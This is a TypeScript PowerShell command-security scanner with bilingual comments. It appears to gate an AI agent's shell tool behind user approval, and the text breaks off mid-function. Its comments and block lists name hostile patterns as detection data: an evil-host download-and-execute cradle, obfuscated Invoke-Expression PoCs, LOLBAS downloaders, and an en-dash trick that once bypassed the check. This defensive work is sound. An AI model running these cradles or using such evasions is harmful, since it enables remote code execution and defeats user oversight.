/**
 * 【一句话定位】PowerShell 专用的**安全特征扫描器**：把一条命令的 AST 过一遍，
 * 命中任何已知危险模式（代码注入、下载执行、提权、动态命令名、COM 对象、
 * 计划任务持久化、WMI 起进程……）就返回 ask —— 弹框让用户确认。
 *
 * 【在架构中的位置】
 *   powershellPermissions.ts（权限主流程的"第 N 步"）
 *        ──调用──> powershellCommandIsSafe(command, parsed)  ←── 本文件对外唯一入口
 *   PowerShellTool.tsx ──> powershellPermissions.ts ──> 本文件
 *   本文件 ──> utils/powershell/parser.js（AST 遍历：getAllCommands / hasCommandNamed /
 *                 deriveSecurityFlags / getVariablesByScope / commandHasArgAbbreviation /
 *                 COMMON_ALIASES）
 *             ──> utils/powershell/dangerousCmdlets.js（危险 cmdlet 名单）
 *             ──> clmTypes.js（.NET 类型白名单判定）
 *
 *   对照 BashTool：src/tools/BashTool/bashSecurity.ts 是 Unix 版同构文件，
 *   函数名不同（那边叫 bashCommandIsSafe）但**模式完全一样**：
 *   一堆小的 check 函数 + 一个主函数把它们排成数组顺序执行，命中即返回 ask。
 *   差异在于危险清单内容：Unix 侧是 curl|bash、chmod +x、sudo 之类；
 *   这里则是 Invoke-Expression、IWR|IEX、Start-Process -Verb RunAs、Add-Type 等
 *   PowerShell 特有的攻击面（PowerShell 的危险面明显更大，所以本文件比 Unix 版长得多）。
 *
 * 【关键设计：全部基于 AST，不做字符串匹配】
 *   PowerShell 语法极其灵活（别名、参数缩写、Unicode 破折号、反引号转义、
 *   冒号绑定值、splatting…），靠正则扫字符串必然被绕过。
 *   所以这里统一用 PowerShell **自己的解析器**产出的 AST 做判定
 *   （parser.js 负责调 .NET 解析器）。
 *   一旦 AST 解析失败（parsed.valid === false），本文件所有 check 都匹配不上，
 *   主函数会直接返回 ask —— 即"看不懂就问用户"，fail-safe。
 *
 * 【返回值的三种语义】
 *   ask         = 命中危险特征，必须弹框
 *   passthrough = 本文件没意见，交回上层继续判定
 *   allow       = 明确安全（本文件实际不产生 allow，只是类型上保留）
 *
 * 【本文件包含什么】（下方 22 个 check* 函数，按主函数里的顺序执行）
 *   checkInvokeExpression         、checkDynamicCommandName、checkEncodedCommand、
 *   checkPwshCommandOrFile        、checkDownloadCradles   、checkDownloadUtilities、
 *   checkAddType                  、checkComObject          、checkDangerousFilePathExecution、
 *   checkInvokeItem               、checkScheduledTask      、checkForEachMemberName、
 *   checkStartProcess             、checkScriptBlockInjection、checkSubExpressions、
 *   checkExpandableStrings        、checkSplatting          、checkStopParsing、
 *   checkMemberInvocations        、checkTypeLiterals       、checkEnvVarManipulation、
 *   checkModuleLoading            、checkRuntimeStateManipulation、checkWmiProcessSpawn
 *   辅助：isPowerShellExecutable / psExeHasParamAbbreviation / isDownloader / isIex
 *
 * 【TS 语法速查】
 *   type X = { behavior: 'passthrough' | 'ask' | 'allow'; message?: string }
 *     ① 字符串**字面量联合类型**：behavior 只能取这三个字符串之一，
 *        写别的串编译期就报错。≈ Java 的 enum，但不用单独定义枚举类。
 *        这种"用某个字段区分形态"的类型叫**可辨识联合**（discriminated union），
 *        ≈ Java 17 的 sealed interface + record。
 *     ② message?: string —— 问号 = 可选字段（可能没有），≈ @Nullable 且编译器强制判空。
 *   const validators = [ fn1, fn2, ... ]
 *     函数也是值，可以放进数组 —— ≈ Java 的方法引用数组 `Runnable[]`/`Function[]`。
 *     好处：新增一个检查只要往数组里加一项，不必改主流程。
 *   for (const validator of validators) { const r = validator(parsed) ... }
 *     ≈ Java 的 for (Function<AST, Result> v : validators) { Result r = v.apply(parsed); }
 *   cmd.elementTypes?.[0]
 *     两个语法叠加：?. 可选链 + ?.[ ] 可选索引。elementTypes 不存在时整体短路为
 *     undefined，**不会**抛 NPE。≈ Java 的 if (x != null) x.get(0) else null。
 *   COMMON_ALIASES[lower]?.toLowerCase() ?? lower
 *     ≈ Java: String a = map.get(k); a == null ? lower : a.toLowerCase()
 *     ?? 只把 null/undefined 换成默认值（0 和 '' 不受影响，与 || 的关键区别）。
 *   parsed.typeLiterals ?? []
 *     ?? 给个空数组兜底，后面 for...of 遍历空数组不会出错（省掉判空分支）。
 */
/**
 * PowerShell-specific security analysis for command validation.
 *
 * Detects dangerous patterns: code injection, download cradles, privilege
 * escalation, dynamic command names, COM objects, etc.
 *
 * All checks are AST-based. If parsing failed (valid=false), none of the
 * individual checks match and powershellCommandIsSafe returns 'ask'.
 */

// 危险 cmdlet 名单集中放在 dangerousCmdlets.js，本文件只 import 使用。
// 集中管理的好处：多处（安全扫描、UI 建议、权限规则）用的是同一份名单，
// 不会出现「这边拦了那边没拦」的口径不一致。
import {
  DANGEROUS_SCRIPT_BLOCK_CMDLETS,
  FILEPATH_EXECUTION_CMDLETS,
  MODULE_LOADING_CMDLETS,
} from '../../utils/powershell/dangerousCmdlets.js'
import type {
  ParsedCommandElement,
  ParsedPowerShellCommand,
} from '../../utils/powershell/parser.js'
import {
  COMMON_ALIASES,
  commandHasArgAbbreviation,
  deriveSecurityFlags,
  getAllCommands,
  getVariablesByScope,
  hasCommandNamed,
} from '../../utils/powershell/parser.js'
import { isClmAllowedType } from './clmTypes.js'

// 返回类型：behavior 决定「要不要弹框」，message 是弹框里给用户看的原因。
// 注意字面量联合 'passthrough' | 'ask' | 'allow'：写错字符串编译期就报错。
type PowerShellSecurityResult = {
  behavior: 'passthrough' | 'ask' | 'allow'
  message?: string
}

// PowerShell 的可执行文件名（含 .exe）。用来识别「又启动了一个 PowerShell」。
const POWERSHELL_EXECUTABLES = new Set([
  'pwsh',
  'pwsh.exe',
  'powershell',
  'powershell.exe',
])

/**
 * 【中文】判断命令名是不是 PowerShell 自己的可执行文件（pwsh / powershell）。
 *
 * 为什么要处理路径：命令常常写成完整路径
 * （/usr/bin/pwsh、C:\Windows\...\powershell.exe、.\pwsh），
 * 只比较全名会漏掉这些写法。
 *
 * @param name 命令名原始文本（可能带路径）
 * @returns true = 这是 PowerShell 自己
 *
 * 步骤：① 转小写后直接查表（最常见的裸写 pwsh）
 *      ② 查不到就找最后一个路径分隔符（/ 和 \ 都要考虑），取 basename 再查
 *      ③ 都没有则不是
 */
/**
 * Extracts the base executable name from a command, handling full paths
 * like /usr/bin/pwsh, C:\Windows\...\powershell.exe, or .\pwsh.
 */
function isPowerShellExecutable(name: string): boolean {
  const lower = name.toLowerCase()
  if (POWERSHELL_EXECUTABLES.has(lower)) {
    return true
  }
  // Extract basename from paths (both / and \ separators)
// Math.max 取两个 lastIndexOf 里更靠后的那个：
// 因为路径里可能同时出现 / 和 \（PowerShell 两种分隔符都认），
// 只看其中一个会在混写路径上取错 basename。
  const lastSep = Math.max(lower.lastIndexOf('/'), lower.lastIndexOf('\\'))
  if (lastSep >= 0) {
    return POWERSHELL_EXECUTABLES.has(lower.slice(lastSep + 1))
  }
  return false
}

/**
 * 【中文】PowerShell 认可的各种「替代减号」字符。
 *
 * 危险在哪（对应上方英文注释）：PowerShell 的词法分析器把
 * ASCII 减号 -、斜杠 /、en-dash –、em-dash —、horizontal bar ―
 * **全都当成参数前缀**。而 AST 里保留的是源码原始字符，
 * 所以只按 - 去比对的检查会被 -Verb 的破折号变体绕过。
 * 这就是下面 psExeHasParamAbbreviation 存在的理由。
 */
/**
 * Alternative parameter-prefix characters that PowerShell accepts as equivalent
 * to ASCII hyphen-minus (U+002D). PowerShell's tokenizer (SpecialCharacters.IsDash)
 * and powershell.exe's CommandLineParameterParser both accept all four dash
 * characters plus Windows PowerShell 5.1's `/` parameter delimiter.
 * Extent.Text preserves the raw character; transformCommandAst uses ce.text for
 * CommandParameterAst elements, so these reach us unchanged.
 */
// 用 \u2013 这类 Unicode 转义写字符常量，而不是直接写破折号字形：
// 直接写字形在代码里肉眼分不清（– 和 — 长得几乎一样），可读性差且易误改。
const PS_ALT_PARAM_PREFIXES = new Set([
  '/', // Windows PowerShell 5.1 (powershell.exe, not pwsh 7+)
  '\u2013', // en-dash
  '\u2014', // em-dash
  '\u2015', // horizontal bar
])

/**
 * 【中文】判断命令里有没有某个参数（**支持缩写 + 各种替代减号**）。
 *
 * 为什么不能直接调 commandHasArgAbbreviation（对应上方英文注释）：
 *   那个函数只认 ASCII 减号。历史上 checkComObject / checkStartProcess /
 *   checkDangerousFilePathExecution / checkForEachMemberName 直接调它，
 *   于是 `Start-Process foo –Verb RunAs`（用的是 en-dash）就绕过去了。
 *   所以统一改走这个包装函数。
 *
 * @param cmd 单个命令元素（含 args 数组）
 * @param fullParam 参数全名，如 '-encodedcommand'
 * @param minPrefix 无歧义的最短缩写，如 '-e'
 * @returns true = 命令里用了这个参数（或它的合法缩写）
 *
 * 步骤：① 先按原文查一次
 *      ② 构造一个「参数前缀已归一化成 -」的临时 cmd，再查一次
 */
/**
 * Wrapper around commandHasArgAbbreviation that also matches alternative
 * parameter prefixes (`/`, en-dash, em-dash, horizontal-bar). PowerShell's
 * tokenizer (SpecialCharacters.IsDash) accepts these for both powershell.exe
 * args AND cmdlet parameters, so use this for ALL PS param checks — not just
 * pwsh.exe invocations. Previously checkComObject/checkStartProcess/
 * checkDangerousFilePathExecution/checkForEachMemberName used bare
 * commandHasArgAbbreviation, so `Start-Process foo –Verb RunAs` bypassed.
 */
function psExeHasParamAbbreviation(
  cmd: ParsedCommandElement,
  fullParam: string,
  minPrefix: string,
): boolean {
  if (commandHasArgAbbreviation(cmd, fullParam, minPrefix)) {
    return true
  }
  // Normalize alternative prefixes to `-` and re-check. Build a synthetic cmd
  // with normalized args; commandHasArgAbbreviation handles colon-value split.
// `{ ...cmd }` 是**对象展开**：复制 cmd 的所有字段，再覆盖 args。
// ≈ Java 的 new Cmd(cmd.xxx..., newArgs)，但 TS 不用逐个字段手写；
// 这是「不可变更新」的标准写法 —— 原对象不被修改，返回一个新对象。
// 注意 ... 后面同名字段会覆盖前面的，所以 args 写在展开之后才生效。
  const normalized: ParsedCommandElement = {
    ...cmd,
    args: cmd.args.map(a =>
// a[0]! 的 ! 是非空断言（≈ Java 强制转型，运行时不检查）。
// 这里安全是因为上一行先判了 a.length > 0。
      a.length > 0 && PS_ALT_PARAM_PREFIXES.has(a[0]!) ? '-' + a.slice(1) : a,
    ),
  }
  return commandHasArgAbbreviation(normalized, fullParam, minPrefix)
}

/**
 * 【中文】检测 Invoke-Expression（别名 iex）—— PowerShell 里的 **eval**。
 *
 * 为什么必须拦：它能把任意字符串当代码执行，
 * 于是所有静态分析（我们看的是源码文本）都失去意义 ——
 * 真正被执行的文本可以是运行时才拼出来的。
 *
 * @returns 命中返回 ask；否则 passthrough
 */
/**
 * Checks if a PowerShell command uses Invoke-Expression or its alias (iex).
 * These are equivalent to eval and can execute arbitrary code.
 */
function checkInvokeExpression(
  parsed: ParsedPowerShellCommand,
): PowerShellSecurityResult {
// hasCommandNamed 会顺带处理别名（iex）与大小写，所以这里只写全名即可。
  if (hasCommandNamed(parsed, 'Invoke-Expression')) {
    return {
      behavior: 'ask',
      message:
        'Command uses Invoke-Expression which can execute arbitrary code',
    }
  }
  return { behavior: 'passthrough' }
}

/**
 * 【中文】检测**动态命令名**：命令名字本身是个表达式，静态无法确定它是什么。
 *
 * 三种典型写法（对应上方英文注释里的 PoC）：
 *   & ${function:Invoke-Expression} 'payload'   （变量表达式）
 *   & ('iex','x')[0] 'payload'                  （索引表达式）
 *   & ('i'+'ex') 'payload'                      （字符串拼接）
 * 这三种在 AST 里的 cmd.name 分别是那一串**字面文本**，
 * 自然匹配不上 hasCommandNamed('Invoke-Expression')，但运行时都会变成 iex。
 *
 * 为什么用**白名单**而不是黑名单（关键设计，见英文注释）：
 *   正常命令名一定是 StringConstant。而「危险的」类型列不全 ——
 *   mapElementType 的默认分支会把所有不认识的 AST 类型都归成 'Other'，
 *   所以写 `=== 'Variable'` 这种黑名单判断必然漏。
 *   结论：只放行 StringConstant，其余一律 ask。这是 fail-closed 的典范。
 */
/**
 * Checks for dynamic command invocation where the command name itself is an
 * expression that cannot be statically resolved.
 *
 * PoCs:
 *   & ${function:Invoke-Expression} 'payload'  — VariableExpressionAst
 *   & ('iex','x')[0] 'payload'                 — IndexExpressionAst → 'Other'
 *   & ('i'+'ex') 'payload'                     — BinaryExpressionAst → 'Other'
 *
 * In all cases cmd.name is the literal extent text (e.g. "('iex','x')[0]"),
 * which doesn't match hasCommandNamed('Invoke-Expression'). At runtime
 * PowerShell evaluates the expression to a command name and invokes it.
 *
 * Legitimate command names are ALWAYS StringConstantExpressionAst (mapped to
 * 'StringConstant'): `Get-Process`, `git`, `ls`. Any other element type in
 * name position is dynamic. Rather than denylisting dynamic types (fragile —
 * mapElementType's default case maps unknown AST types to 'Other', which a
 * `=== 'Variable'` check misses), we allowlist 'StringConstant'.
 *
 * elementTypes[0] is the command-name element (transformCommandAst pushes it
 * first, before arg elements). The `!== undefined` guard preserves fail-open
 * when elementTypes is absent (parse-detail unavailable — if parsing failed
 * entirely, valid=false already returns 'ask' earlier in the chain).
 */
function checkDynamicCommandName(
  parsed: ParsedPowerShellCommand,
): PowerShellSecurityResult {
  for (const cmd of getAllCommands(parsed)) {
    if (cmd.elementType !== 'CommandAst') {
      continue
    }
// `cmd.elementTypes?.[0]`：可选链 + 可选索引，elementTypes 缺失时短路成 undefined。
// elementTypes[0] 是**命令名本身**的元素类型（parser 特意把它放在第一个）。
    const nameElementType = cmd.elementTypes?.[0]
// 两处 !== undefined 的守卫：elementTypes 缺失时**保持放行**（fail-open）；
// 这不是疏忽 —— 解析细节缺失时 parsed.valid 已经是 false，
// 主函数早在更前面就返回 ask 了，所以这里不会造成实际风险。
    if (nameElementType !== undefined && nameElementType !== 'StringConstant') {
      return {
        behavior: 'ask',
        message:
          'Command name is a dynamic expression which cannot be statically validated',
      }
    }
  }
  return { behavior: 'passthrough' }
}

/**
 * 【中文】检测 -EncodedCommand（缩写 -e）：把整条命令 base64 编码后传入。
 *
 * 为什么危险：这是恶意软件的标配手法 —— 载荷被编码后，
 * 任何基于文本的检测（含我们这套）都看不到真实内容。
 *
 * @returns 命中返回 ask（提示「参数意图不明」）
 */
/**
 * Checks for encoded command parameters which obscure intent.
 * These are commonly used in malware to bypass security tools.
 */
function checkEncodedCommand(
  parsed: ParsedPowerShellCommand,
): PowerShellSecurityResult {
  for (const cmd of getAllCommands(parsed)) {
// 只对 PowerShell 自己的可执行文件检查这个参数：
// 别的命令碰巧有 -e 参数（如 Get-ChildItem 没有，但第三方有）不该被误伤。
    if (isPowerShellExecutable(cmd.name)) {
      if (psExeHasParamAbbreviation(cmd, '-encodedcommand', '-e')) {
        return {
          behavior: 'ask',
          message: 'Command uses encoded parameters which obscure intent',
        }
      }
    }
  }
  return { behavior: 'passthrough' }
}

/**
 * 【中文】检测**嵌套 PowerShell 进程**（又起了一个 pwsh/powershell）。
 *
 * 为什么只要出现在命令位置就拦（对应上方英文注释）：
 *   不一定非要 -Command / -File 才危险 ——
 *   裸的 `pwsh` 从管道读 stdin（Get-Content x | pwsh）或吃一个位置参数脚本路径，
 *   照样执行任意代码，而且**一个显式的危险 flag 都没有**。
 *   子进程要跑什么我们无法静态分析，所以一律 ask。
 */
/**
 * Checks for PowerShell re-invocation (nested pwsh/powershell process).
 *
 * Any PowerShell executable in command position is flagged — not just
 * -Command/-File. Bare `pwsh` receiving stdin (`Get-Content x | pwsh`) or
 * a positional script path executes arbitrary code with none of the explicit
 * flags present. Same unvalidatable-nested-process reasoning as
 * checkStartProcess vector 2: we cannot statically analyze what the child
 * process will run.
 */
function checkPwshCommandOrFile(
  parsed: ParsedPowerShellCommand,
): PowerShellSecurityResult {
  for (const cmd of getAllCommands(parsed)) {
    if (isPowerShellExecutable(cmd.name)) {
      return {
        behavior: 'ask',
        message:
          'Command spawns a nested PowerShell process which cannot be validated',
      }
    }
  }
  return { behavior: 'passthrough' }
}

/**
 * 【中文】检测**下载执行链（download cradle）**：先下载远程内容、再执行它。
 *
 * 两种形态都要覆盖：
 *   ① 同一条语句内联：IWR http://evil/x | IEX   （「一条里同时出现下载和执行」）
 *   ② 跨语句拆分：   $r = IWR ...; IEX $r.Content
 *      （严格说第 ② 种已经被 checkInvokeExpression 拦住了，
 *       这里再拦一次是为了给出**更准确的提示文案**）
 */
/**
 * Checks for download cradle patterns - common malware techniques
 * that download and execute remote code.
 *
 * Per-statement: catches piped cradles (`IWR ... | IEX`).
 * Cross-statement: catches split cradles (`$r = IWR ...; IEX $r.Content`).
 * The cross-statement case is already blocked by checkInvokeExpression (which
 * scans all statements), but this check improves the warning message.
 */
// 下载类 cmdlet 名单。new-object 也在里面，因为它常被用来实例化
// System.Net.WebClient 去下载（DownloadString / DownloadFile）。
// start-bitstransfer 对应 MITRE ATT&CK 的 T1197（BITS 作业下载）。
const DOWNLOADER_NAMES = new Set([
  'invoke-webrequest',
  'iwr',
  'invoke-restmethod',
  'irm',
  'new-object',
  'start-bitstransfer', // MITRE T1197
])

// 注意这两个小函数只做**小写规范化后的名字比较**，不解析别名 ——
// 因为 DOWNLOADER_NAMES 里已经把常见别名（iwr/irm）直接列进去了。
function isDownloader(name: string): boolean {
  return DOWNLOADER_NAMES.has(name.toLowerCase())
}

function isIex(name: string): boolean {
  const lower = name.toLowerCase()
  return lower === 'invoke-expression' || lower === 'iex'
}

function checkDownloadCradles(
  parsed: ParsedPowerShellCommand,
): PowerShellSecurityResult {
  // Per-statement: piped cradle (IWR ... | IEX)
// 逐条语句检查（同一条 pipeline 里同时有下载和执行才算内联 cradle）。
  for (const statement of parsed.statements) {
    const cmds = statement.commands
    if (cmds.length < 2) {
      continue
    }
// `.some(fn)` ≈ Java 的 stream().anyMatch(fn)：只要有一个满足就 true。
// 同族还有 every（allMatch）、filter、map，本项目到处在用。
    const hasDownloader = cmds.some(cmd => isDownloader(cmd.name))
    const hasIex = cmds.some(cmd => isIex(cmd.name))
    if (hasDownloader && hasIex) {
      return {
        behavior: 'ask',
        message: 'Command downloads and executes remote code',
      }
    }
  }

// 跨语句检查：把整条命令的所有语句摊平后，只要「既出现下载、又出现 iex」就拦。
  // Cross-statement: split cradle ($r = IWR ...; IEX $r.Content).
  // No new false positives: if IEX is present, checkInvokeExpression already asks.
  const all = getAllCommands(parsed)
  if (all.some(c => isDownloader(c.name)) && all.some(c => isIex(c.name))) {
    return {
      behavior: 'ask',
      message: 'Command downloads and executes remote code',
    }
  }

  return { behavior: 'passthrough' }
}

/**
 * 【中文】检测**独立的下载工具**（不需要配合 iex 也要拦）。
 *
 * 与 checkDownloadCradles 的分工：那边要求「下载 + 执行」成对出现；
 * 这边认为「下载这个动作本身」就值得提醒（LOLBAS 手法常用系统自带工具下载）。
 *
 * 三条规则各自的取舍（对应英文注释）：
 *   Start-BitsTransfer → 天生就是传文件的，无条件拦；
 *   certutil           → 只在带 -urlcache 时拦（裸 certutil 有大量正当用途：
 *                        证书存储查询、编码转换等，一律拦会严重误伤）；
 *   bitsadmin /transfer → 老式 BITS 命令行，与 Start-BitsTransfer 同威胁。
 */
/**
 * Checks for standalone download utilities — LOLBAS tools commonly used to
 * fetch payloads. Unlike checkDownloadCradles (which requires download + IEX
 * in-pipeline), this flags the download operation itself.
 *
 * Start-BitsTransfer: always a file transfer (MITRE T1197).
 * certutil -urlcache: classic LOLBAS download. Only flagged with -urlcache;
 * bare `certutil` has many legitimate cert-management uses.
 * bitsadmin /transfer: legacy BITS download (pre-PowerShell).
 */
function checkDownloadUtilities(
  parsed: ParsedPowerShellCommand,
): PowerShellSecurityResult {
  for (const cmd of getAllCommands(parsed)) {
    const lower = cmd.name.toLowerCase()
    // Start-BitsTransfer is purpose-built for file transfer — no safe variant.
    if (lower === 'start-bitstransfer') {
      return {
        behavior: 'ask',
        message: 'Command downloads files via BITS transfer',
      }
    }
    // certutil / certutil.exe — only when -urlcache is present. certutil has
    // many non-download uses (cert store queries, encoding, etc.).
    // certutil.exe accepts both -urlcache and /urlcache per standard Windows
    // utility convention — check both forms (bitsadmin below does the same).
// 注意同时接受 -urlcache 和 /urlcache：Windows 系命令行工具两种前缀都收，
// 只认一种就会被另一种绕过（bitsadmin 那边同理）。
    if (lower === 'certutil' || lower === 'certutil.exe') {
      const hasUrlcache = cmd.args.some(a => {
        const la = a.toLowerCase()
        return la === '-urlcache' || la === '/urlcache'
      })
      if (hasUrlcache) {
        return {
          behavior: 'ask',
          message: 'Command uses certutil to download from a URL',
        }
      }
    }
    // bitsadmin /transfer — legacy BITS CLI, same threat as Start-BitsTransfer.
    if (lower === 'bitsadmin' || lower === 'bitsadmin.exe') {
      if (cmd.args.some(a => a.toLowerCase() === '/transfer')) {
        return {
          behavior: 'ask',
          message: 'Command downloads files via BITS transfer',
        }
      }
    }
  }
  return { behavior: 'passthrough' }
}

/**
 * 【中文】检测 Add-Type：它在运行时**编译并加载 .NET 代码**。
 *
 * 为什么危险：等于给脚本开了一条「直接写 C# 并执行」的通道，
 * PowerShell 层面的任何限制都可以被绕开。
 */
/**
 * Checks for Add-Type usage which compiles and loads .NET code at runtime.
 * This can be used to execute arbitrary compiled code.
 */
function checkAddType(
  parsed: ParsedPowerShellCommand,
): PowerShellSecurityResult {
  if (hasCommandNamed(parsed, 'Add-Type')) {
    return {
      behavior: 'ask',
      message: 'Command compiles and loads .NET code',
    }
  }
  return { behavior: 'passthrough' }
}

/**
 * 【中文】检测 New-Object -ComObject（创建 COM 对象）。
 *
 * 为什么必须拦（对应上方英文注释）：
 *   WScript.Shell、Shell.Application、MMC20.Application、Schedule.Service、
 *   Msxml2.XMLHTTP 这类 COM 对象**自带执行/下载能力**，根本不需要 iex。
 *   危险 ProgID 列不全，所以策略是：**任何** -ComObject 都 ask。
 *   （创建对象本身是惰性的，这里只是提示用户「这是个执行原语」；
 *    真正调用它的方法由 checkMemberInvocations 单独拦。）
 *
 * 本函数还有第二段职责见下方 360 行的 SECURITY 注释：
 *   把 New-Object 的 -TypeName（字符串形式的 .NET 类型名）也送去 CLM 白名单检查。
 */
/**
 * Checks for New-Object -ComObject. COM objects like WScript.Shell,
 * Shell.Application, MMC20.Application, Schedule.Service, Msxml2.XMLHTTP
 * have their own execution/download capabilities — no IEX required.
 *
 * We can't enumerate all dangerous ProgIDs, so flag any -ComObject. Object
 * creation alone is inert, but the prompt should warn the user that COM
 * instantiation is an execution primitive. Method invocation on the result
 * (.Run(), .Exec()) is separately caught by checkMemberInvocations.
 */
function checkComObject(
  parsed: ParsedPowerShellCommand,
): PowerShellSecurityResult {
  for (const cmd of getAllCommands(parsed)) {
    if (cmd.name.toLowerCase() !== 'new-object') {
      continue
    }
    // -ComObject min abbrev is -com (New-Object params: -TypeName, -ComObject,
    // -ArgumentList, -Property, -Strict; -co is ambiguous in PS5.1 due to
    // common params like -Confirm, so use -com).
// 缩写下界取 -com 而不是 -co：PS 5.1 里 -co 会跟通用参数 -Confirm 撞车（歧义），
// 所以 -ComObject 的无歧义最短缩写是 -com。这种「缩写边界」全靠实测确定。
    if (psExeHasParamAbbreviation(cmd, '-comobject', '-com')) {
      return {
        behavior: 'ask',
        message:
          'Command instantiates a COM object which may have execution capabilities',
      }
    }
// ===== 关键补丁（对应上方 SECURITY 英文注释）=====
// checkTypeLiterals 只能看到 [方括号] 写法产生的 TypeExpressionAst。
// 而 `New-Object System.Net.WebClient` 是把类型名当成**字符串参数**传的，
// 在 AST 里是 StringConstantExpressionAst —— CLM 检查压根不会触发！
// 于是这里要把 -TypeName 的值（命名式 / 冒号绑定 / 位置参数三种写法）都抽出来，
// 手动送进 isClmAllowedType。少这一步，最经典的下载器就漏了。
    // SECURITY: checkTypeLiterals only sees [bracket] syntax from
    // parsed.typeLiterals. `New-Object System.Net.WebClient` passes the type
    // as a STRING ARG (StringConstantExpressionAst), not a TypeExpressionAst,
    // so CLM never fires. Extract -TypeName (named, colon-bound, or
    // positional-0) and run through isClmAllowedType. Closes attackVectors D4.
    let typeName: string | undefined
// 第一轮扫描：先找显式的 -TypeName（含 -t 缩写）、支持冒号绑定与空格分隔两种写法。
    for (let i = 0; i < cmd.args.length; i++) {
      const a = cmd.args[i]!
      const lower = a.toLowerCase()
      // -TypeName abbrev: -t is unambiguous (no other New-Object -t* params).
      // Handle colon-bound form first: -TypeName:Foo.Bar
      if (lower.startsWith('-t') && lower.includes(':')) {
        const colonIdx = a.indexOf(':')
        const paramPart = lower.slice(0, colonIdx)
// 又是 `'-typename'.startsWith(paramPart)` 这个反向技巧：
// 用完整名去匹配「是不是以这个缩写开头」，一行覆盖 -t / -ty / -typ ... 全部写法。
        if ('-typename'.startsWith(paramPart)) {
          typeName = a.slice(colonIdx + 1)
          break
        }
      }
      // Space-separated form: -TypeName Foo.Bar
      if (
        lower.startsWith('-t') &&
        '-typename'.startsWith(lower) &&
        cmd.args[i + 1] !== undefined
      ) {
        typeName = cmd.args[i + 1]
        break
      }
    }
    // Positional-0 binds to -TypeName (NetParameterSet default). Named params
    // (-Strict, -ArgumentList, -Property, -ComObject) may appear before the
    // positional TypeName, so scan past them to find the first non-consumed arg.
// 第二轮扫描：处理**位置参数**写法。New-Object 的 0 号位置参数默认绑到 -TypeName，
// 但命名参数（-Strict / -ArgumentList / -Property / -ComObject）可能排在它前面，
// 所以要跳过它们及其值，找到第一个「没有被消费掉」的非开关参数。
    if (typeName === undefined) {
      // New-Object named params that consume a following value argument
// 这两个小集合是本函数内部临时构造的「参数元信息表」：
// VALUE_PARAMS = 会吃掉后面一个值；SWITCH_PARAMS = 开关型，不吃值。
// 手写这张表是因为 PowerShell 的参数绑定规则无法从 AST 直接得知。
      const VALUE_PARAMS = new Set(['-argumentlist', '-comobject', '-property'])
      // Switch params (no value argument)
      const SWITCH_PARAMS = new Set(['-strict'])
      for (let i = 0; i < cmd.args.length; i++) {
        const a = cmd.args[i]!
        if (a.startsWith('-')) {
          const lower = a.toLowerCase()
          // Skip -TypeName variants (already handled by named-param loop above)
          if (lower.startsWith('-t') && '-typename'.startsWith(lower)) {
            i++ // skip value
            continue
          }
          // Colon-bound form: -Param:Value (single token, no skip needed)
          if (lower.includes(':')) continue
          if (SWITCH_PARAMS.has(lower)) continue
          if (VALUE_PARAMS.has(lower)) {
            i++ // skip value
            continue
          }
// 未知参数也保守地跳过（不把它当 TypeName）：宁可漏报也不要误判成类型名而误拦。
          // Unknown param — skip conservatively
          continue
        }
        // First non-dash arg is the positional TypeName
        typeName = a
        break
      }
    }
// 抽到类型名后走 CLM 白名单：不在白名单里 → ask。
// 这是「白名单 + fail-closed」思路在本文件里的第二个落点。
    if (typeName !== undefined && !isClmAllowedType(typeName)) {
      return {
        behavior: 'ask',
        message: `New-Object instantiates .NET type '${typeName}' outside the ConstrainedLanguage allowlist`,
      }
    }
  }
  return { behavior: 'passthrough' }
}

// （上方那大段英文注释说明的是：下面这个函数要补的是 -FilePath 这个「缺口」，
//  详见函数内的中文说明。）
/**
 * Checks for DANGEROUS_SCRIPT_BLOCK_CMDLETS invoked with -FilePath (or
 * -LiteralPath). These run a script file — arbitrary code execution with no
 * ScriptBlockAst in the tree.
 *
 * checkScriptBlockInjection only fires when hasScriptBlocks is true. With
 * -FilePath there is no ScriptBlockAst, so DANGEROUS_SCRIPT_BLOCK_CMDLETS is
 * never consulted. This check closes that gap for the -FilePath vector.
 *
 * Cmdlets in DANGEROUS_SCRIPT_BLOCK_CMDLETS that accept -FilePath:
 *   Invoke-Command   -FilePath             (icm alias via COMMON_ALIASES)
 *   Start-Job        -FilePath, -LiteralPath
 *   Start-ThreadJob  -FilePath
 *   Register-ScheduledJob -FilePath
 * The *-PSSession and Register-*Event entries do not accept -FilePath.
 *
 * -f is unambiguous for -FilePath on all four (no other -f* params).
 * -l is unambiguous for -LiteralPath on Start-Job; harmless no-op on the
 * others (no -l* params to collide with).
 */

/**
 * 【中文】检测「用危险 cmdlet 去执行一个**脚本文件**」的写法。
 *
 * 它补的是什么缺口（对应上方英文注释）：
 *   checkScriptBlockInjection 只在 AST 里**存在 ScriptBlockAst** 时才触发。
 *   而 `Invoke-Command -FilePath x.ps1` 根本不产生脚本块节点 ——
 *   它只是传了个文件路径，但效果同样是执行任意代码。
 *   所以这里专门针对 -FilePath / -LiteralPath 这两个参数补一道。
 *
 * @returns 命中返回 ask
 *
 * 步骤：① 命令名（经别名解析）是否属于支持 -FilePath 的危险 cmdlet
 *      ② 检查是否用了 -FilePath / -LiteralPath（含缩写与替代减号）
 *      ③ 兜底：还要检查**位置参数**形式的字符串（Start-Job script.ps1 也会绑到 -FilePath）
 */
function checkDangerousFilePathExecution(
  parsed: ParsedPowerShellCommand,
): PowerShellSecurityResult {
  for (const cmd of getAllCommands(parsed)) {
    const lower = cmd.name.toLowerCase()
// `COMMON_ALIASES[lower]?.toLowerCase() ?? lower`：先尝试别名解析，
// 解析不到就用原名。?? 只在 null/undefined 时兜底。
    const resolved = COMMON_ALIASES[lower]?.toLowerCase() ?? lower
    if (!FILEPATH_EXECUTION_CMDLETS.has(resolved)) {
      continue
    }
    if (
      psExeHasParamAbbreviation(cmd, '-filepath', '-f') ||
      psExeHasParamAbbreviation(cmd, '-literalpath', '-l')
    ) {
      return {
        behavior: 'ask',
        message: `${cmd.name} -FilePath executes an arbitrary script file`,
      }
    }
// 位置参数兜底：`Start-Job script.ps1` 会把 0 号位置参数绑到 -FilePath
// （如果传的是 ScriptBlock 则走另一个参数集，不会绑到 -FilePath）。
// 这里宁可**多报**（比如 -Name foo 里的 foo 也是 StringConstant 会命中），
// 因为多报只是多弹一次框，漏报就是执行任意脚本。
    // Positional binding: `Start-Job script.ps1` binds position-0 to
    // -FilePath via FilePathParameterSet resolution (ScriptBlock args select
    // ScriptBlockParameterSet instead). Same pattern as checkForEachMemberName:
    // any non-dash StringConstant is a potential -FilePath. Over-flagging
    // (e.g., `Start-Job -Name foo` where `foo` is StringConstant) is fail-safe.
